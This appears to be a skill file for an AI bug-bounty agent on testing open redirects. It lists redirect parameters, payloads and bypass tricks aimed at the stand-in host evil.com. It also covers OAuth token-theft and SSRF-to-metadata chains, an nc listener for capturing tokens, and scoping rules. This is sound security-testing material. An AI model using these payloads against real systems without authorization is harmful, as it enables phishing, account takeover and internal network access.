---
name: open-redirect
description: Open Redirect detection, bypass techniques, and impact escalation. Use when HauntMode identifies redirect parameters (url=, redirect=, next=, return=, goto=), when login/logout flows have post-auth redirect parameters, or when OAuth redirect_uri manipulation is in scope. Standalone open redirect is usually Low/Info; this skill focuses on chains that elevate to Medium/High.
---

# Open Redirect — Detection, Bypasses, and Impact Chains

Grounded in the CBBH Session Security module. Concise by design — open redirect testing is straightforward; the value is in the chains.

---

## 1. Triggers — when this skill applies

- URL parameters named: `url`, `link`, `redirect`, `redirecturl`, `redirect_uri`, `redirect_url`, `return`, `return_to`, `returnurl`, `go`, `goto`, `exit`, `exitpage`, `fromurl`, `fromuri`, `redirect_to`, `next`, `newurl`, `redir`, `callback`, `continue`, `destination`, `dest`, `target`, `forward`
- Login page redirects: `/login?next=/dashboard` or `/login?redirect=/profile`
- Logout pages that redirect back to a URL after sign-out
- OAuth `redirect_uri` parameter
- Password reset flows that redirect to a URL after completion

---

---

## 3. 30-second triage

1. Find any redirect parameter from the list above.
2. Try replacing the value with `https://evil.com`:
   ```
   /login?next=https://evil.com
   /redirect?url=https://evil.com
   ```
3. Follow the redirect chain in Burp — does the final destination land on `evil.com`?
4. If yes: confirmed open redirect. Proceed to impact assessment and chains.
5. If the direct attempt is blocked, proceed to bypass techniques.

---

## 4. Detection payloads

Try these in order from simplest to most obfuscated:

```
https://evil.com
//evil.com
http://evil.com
/\evil.com
\/evil.com
https://evil.com/
https://evil.com%2F
```

---

## 5. Bypass techniques

### 5.1 Path traversal / double-slash tricks

Some validators allow URLs starting with `/` (relative) but block `https://`. Bypass:
```
//evil.com
//evil.com/
////evil.com
/\/evil.com
```

### 5.2 Protocol-relative bypass

```
//evil.com
```

The browser treats `//` as protocol-relative (uses current protocol). The validator may only check for `http://` and `https://`.

### 5.3 URL encoding

```
https%3A%2F%2Fevil.com
%2F%2Fevil.com
https://evil%2Ecom
```

Double-encoding (if the server decodes twice):
```
https%253A%252F%252Fevil.com
```

### 5.4 Subdomain matching bypass

If the validator checks that the host ends with `target.com`:
```
https://attacker.target.com.evil.com
https://evil.com?legit=target.com
https://target.com.evil.com
```

If the validator checks that the host starts with `target.com`:
```
https://target.com.evil.com
```

### 5.5 Null byte / control character insertion

```
https://evil.com%00.target.com
https://evil.com%0d%0a.target.com
```

### 5.6 Fragment manipulation

Some validators parse the URL correctly but fragments bypass regex checks:
```
https://target.com#https://evil.com
https://target.com?a=b#https://evil.com
```

### 5.7 data: and javascript: URI (for href-based redirects)

```
data:text/html,<script>window.location='https://evil.com'</script>
javascript:window.location='https://evil.com'
```

These only work if the redirect is implemented as an `href` attribute (not a server-side `Location` header).

### 5.8 Unicode lookalike characters

```
https://evil.cοm    (Cyrillic ο instead of Latin o)
https://ẹvil.com    (Unicode lookalike)
```

### 5.9 IPv6 and IPv4 obfuscation

```
http://[::1]/
http://0x7f000001/
```

Mainly useful when chaining with SSRF rather than phishing.

---

## 6. Impact escalation — from Low to High/Critical

### 6.1 Standalone open redirect

**Severity: Low / Informational**

An attacker can craft a URL that appears to come from `target.com` but redirects to `evil.com`. Useful for phishing. On its own, most programs rate this Low or Informational.

### 6.2 OAuth token theft via redirect_uri

**Severity: High / Critical**

If the OAuth `redirect_uri` parameter is vulnerable to open redirect:

```
GET /oauth/authorize?
  client_id=CLIENT_ID
  &response_type=token
  &redirect_uri=https://target.com/callback?next=https://evil.com
  &scope=profile
```

The OAuth server redirects the access token to `target.com/callback`, which then redirects to `evil.com` with the token in the fragment. The attacker's page can read the token from `location.hash`.

This turns a Low into a Critical — it directly enables account takeover.

### 6.3 Session token exfil via post-login redirect

**Severity: Medium / High**

If the post-login redirect includes a session token in the URL:

```
/login?redirect=https://evil.com
```

After login, if the token is appended to the redirect URL (`https://evil.com?session=TOKEN`), the attacker's server logs the token.

Check the Location header after login completes — does it include any token or session parameter?

### 6.4 Phishing amplification

**Severity: Medium** (higher if the site is a bank, healthcare, government)

The redirect provides a trusted-looking URL for phishing:
```
https://bank.com/login?next=https://phishing.evil.com
```

The victim sees `bank.com` in their browser before being redirected. Combine with a login form that captures credentials.

### 6.5 SSRF bridge via open redirect

**Severity: Medium / High** (depending on what internal services are reachable)

If the application follows redirects on server-side fetches (like a URL preview or webhook), an open redirect on a trusted host can bypass SSRF allowlists:

```
# App allowlists target.com but follows redirects
# Provide: https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

The server fetches the trusted URL, follows the redirect to the internal endpoint, and returns its contents.

---

## 7. Confirming with a listener

For token theft chains, set up a netcat listener:
```bash
nc -lvnp 1337
```

Then craft: `https://target.com/login?redirect=http://YOUR_IP:1337`

After login, check if any token appears in the request to your listener.

For OOB redirect confirmation when you can't observe the browser:
- Use `YOUR_EZXSS_DOMAIN` as the redirect target and check if a hit comes in

---

## 8. False-positive checks

- **Redirect to same domain only:** If validation allows only same-origin redirects and your bypass attempts all fail, it's properly validated.
- **Server-side validation that doesn't follow redirects:** Some apps block the redirect at the server level. Confirm by actually following the redirect (not just looking at the Location header in Burp — follow all redirects).
- **Whitelist-based redirect_uri:** OAuth providers often use strict whitelist comparison (not substring). Confirm the validator allows your payload before reporting.
- **`rel=noopener` or JavaScript-blocked navigation:** DOM-based redirects may be blocked by browser security features in some contexts.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Open redirect + OAuth redirect_uri | `auth-bypass`, `csrf` | Token theft → account takeover |
| Open redirect + SSRF | `ssrf` | Internal network access via trusted redirect |
| Open redirect + phishing | standalone | Medium impact, useful in comprehensive report |
| Open redirect + XSS (if reflected in error page after redirect) | `xss` | XSS via redirect parameter |
| Open redirect in password reset | `auth-bypass` | Reset token sent to attacker-controlled page |

---

## 10. Reporting template

```
POTENTIAL FINDING: Open Redirect
Target: <full URL with redirect parameter>
Parameter: <param name + location>
Payload: <exact value that caused redirect to evil.com>

Evidence:
  Request:  GET /path?redirect=https://evil.com HTTP/1.1
  Response: HTTP/1.1 302 Found
            Location: https://evil.com

Impact:
  Standalone: Phishing via trusted-looking URL
  (or if chained): <describe chain>
  e.g. "OAuth redirect_uri open redirect enables access token theft;
        the token is appended to the Location header and visible at evil.com"

Severity: <Low (standalone) | Medium (phishing amplified) | High (OAuth chain)>

Chain potential: OAuth token theft / SSRF bridge / post-login token exfil
Next step: <test redirect_uri parameter in OAuth flow | confirm token in redirect>
```

---

## 11. Recon tracker vector strings

Only log if the user explicitly authorizes:

- `open-redirect:<param>` — confirmed open redirect on named param
- `open-redirect:oauth-redirect_uri` — redirect_uri vulnerable (high impact)
- `open-redirect:ssrf-chain` — open redirect usable as SSRF bridge
- `open-redirect:bypass:<technique>` — bypass technique used
- `open-redirect:no:<param>` — tested, properly validated

---

## 12. What NOT to do

- **Do not report standalone open redirect as High or Critical** without a working chain. Most programs rate it Low/Info without a chain.
- **Do not test OAuth redirect_uri manipulation against third-party OAuth providers** (Google, GitHub, etc.) — those are out of scope. Test only the target application's OAuth implementation.
- **Do not exhaust combinations of bypass techniques** without pausing — stay rate-limit aware.
- **Do not auto-log to the recon tracker** without explicit user instruction.
- **Do not test on out-of-scope domains** — check `scope.txt`.
